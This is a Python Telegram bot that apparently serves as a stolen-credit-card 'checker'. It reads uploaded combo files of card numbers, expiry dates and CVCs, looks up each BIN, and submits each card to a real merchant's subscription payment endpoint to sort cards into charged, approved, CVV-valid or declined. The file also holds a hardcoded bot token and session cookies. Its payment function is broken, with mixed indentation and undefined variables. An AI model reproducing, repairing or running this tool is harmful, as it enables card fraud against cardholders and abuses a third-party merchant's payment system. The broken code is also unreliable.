import requests
import telebot
from telebot import types
from datetime import datetime, timedelta
import time
import json
from datetime import datetime, timedelta
import datetime
import time
import random
now = datetime.datetime.today()
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = hour + ':'+ mi +':' + ss + ' '+'0'+mm + '-' + dd + '-' + yyyy 
hours = now.hour
ran= ['45','56','34','12','66','67','90','89','44','65','32','97','58']
pr =random.choice(ran)



token ='7819656172:AAEJGaAP9TUtYUf5yFxj2bt5YqrSNNJcBBk'
#"6303000031:AAGq3oOsx3Z7dWcHYy3OqHATTflP6pTQyKY"
bot=telebot.TeleBot(token,parse_mode="HTML")


def StripeChargebot(ccx):
	import requests
	import time
	ccx=ccx.strip()
	c = ccx.split("|")[0]
	mm= ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
#import requests
	time.sleep(3)
#import requests

	cookies = {
            'sucuri_cloudproxy_uuid_0e749aa32': '9d73b93f5646fab3ec3f5bf1a213d636',
            '_ga': 'GA1.1.414691768.1724575717',
            '_gcl_au': '1.1.1283967854.1724575717',
            'ci_session': 'gmtc8809vskha0fbn19mvae05vm6t341',
            '_ga_4HXMJ7D3T6': 'GS1.1.1724575716.1.1.1724576199.0.0.0',
            '_ga_KQ5ZJRZGQR': 'GS1.1.1724575717.1.1.1724576199.60.0.1944711815',
        }
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.lagreeod.com',
            'priority': 'u=1, i',
            'referer': 'https://www.lagreeod.com/subscribe-payment',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua.random,
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'card[name]': 'Amid Smith',
            'card[number]': cn,
            'card[exp_month]': expm,
            'card[exp_year]': expy,
            'card[cvc]': cv,
            'coupon': '',
            's1': '15',
            'sum': '21',
        }
        response = requests.post('https://www.lagreeod.com/register/validate_subscribe_step_3', cookies=cookies, headers=headers, data=data)
        response_data = response.json()
	if 'Retry later' in req.text:
		ms = 'risk'
		return ms
		time.sleep(15)
	try:
		msg = req.json()['error']
		print(ccx,'¦',msg)
		if "Your card has insufficient funds." in req.json()['error']:
			ms = 'Your card has insufficient funds.'
			return ms
		else:
			ms = req.json()['error']
			return ms
	except:
		if 'requires_action' in req.json():
			ms = '3D Required'
			return ms
		else:
			return req.json()
@bot.message_handler(commands=["start"])
def start(message):
	bot.reply_to(message,'''ar Checker Welcome 

Telegram channels: @dar666787
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe 
Notice : Enjoy  Fast joine

Checker Limited : 10 txt number

𝗜𝗻𝗳𝗼: Bot start 23oct
𝐈𝐬𝐬𝐮𝐞𝐫: 
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: UNITED STATES 🇺🇸

Bot by: @dar666787''')
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	rs = 0
	rsk = 0
	cek = 0
	nop = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message,"Please Wait Status Processing...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
				try:
					url = ('https://lookup.binlist.net/'+cc[:6])
					data = requests.get(url).json()
					
				except:
					pass
				try:
					bank=(data['bank']['name'])
				except:
					bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					emj=(data['country']['emoji'])
				except:
					emj=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					cn=(data['country']['name'])
				except:
					cn=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					dicr=(data['scheme'])
				except:
					dicr=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					typ=(data['type'])
				except:
					typ=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					url=(data['bank']['url'])
				except:
					url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					bran = (data['brand'])
				except:
					bran = ('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				#	start_time = time.time()

				
				start_time = time.time()
				try:
					last = str(StripeChargebot(cc))
				except Exception as e:
					print(e)
					last=e
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"-> {last}", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"-> {cc}", callback_data='u8')
				cm3 = types.InlineKeyboardButton(f"- Charged ✅ -> {ch} ", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"- Approved ✅ -> {live} ", callback_data='x')
				cm7 = types.InlineKeyboardButton(f"- Cvv ✅ -> {rs} ", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"- Declined ❌ -> {dd} ", callback_data='x')
				cm8 = types.InlineKeyboardButton(f"- Risk Wait ❌ -> {rsk} ", callback_data='x')
				cm10 = types.InlineKeyboardButton(f"- Incorrect CC ❌ -> {nop} ", callback_data='x')
				cm6 = types.InlineKeyboardButton(f"- All -> {total}/{cek}", callback_data='x')
				mes.add(cm1, cm2, cm3, cm4, cm7,cm5,cm8,cm10,cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Please Wait Checking Your Cards !.
Programeer - @dar666787 🧸 ''', reply_markup=mes)
				end_time = time.time()
				execution_time = end_time - start_time
				msg = f'''
<strong>- Hello Boss New Approved Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- Info -|:
- THE BIN • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
- Process Date : <code>{t}</code>
--------------------------------------------
- Programmer • @Lx0b2</strong>'''
				msgcvc = f'''
<strong>- Hello Boss New Cvv Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- Info -|:
- THE BIN • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
- Process Date : <code>{t}</code>
--------------------------------------------
- Programmer • @Lx0b2</strong>'''
				if 'Your card was declined.' in last:
					dd += 1
					cek+=1
					time.sleep(15)
				elif 'Your card number is incorrect.' in last:
					nop += 1
					cek+=1
					time.sleep(15)
				elif 'error' in last:
					nop += 1
					cek+=1
					time.sleep(15)
				elif "3D Required" in last:
					rs+=1
					cek+=1
					bot.reply_to(message, msgcvc)
					time.sleep(15)
				elif "Your card's security code is incorrect." in last:
					rs+=1
					cek+=1
					bot.reply_to(message, msgcvc)
					time.sleep(15)
				elif 'risk' in last:
					rsk+=1
					cek+=1
					time.sleep(15)
				elif 'Your card has insufficient funds.' in last:
					live+=1
					cek+=1
					bot.reply_to(message, msg)
					time.sleep(15)
				else:
					ch += 1
					cek+=1
					msg1 = f'''
<strong>- Hello Boss New Approved Charge Card ✅
--------------------------------------------
- GateWay -> Stripe Charge 15 ViP ♕ .
- Message -> {last}
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- Info -|:
- THE BIN • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Process Time : <code>{"{:.1f}".format(execution_time)} seconds </code>
- Process Date : <code>{t}</code>
--------------------------------------------
- Programmer • @Lx0b2</strong>'''
					bot.reply_to(message, msg1)
					time.sleep(15)
	except Exception as eo:
		print(eo)
print("تم تشغيل البوت")
bot.polling()
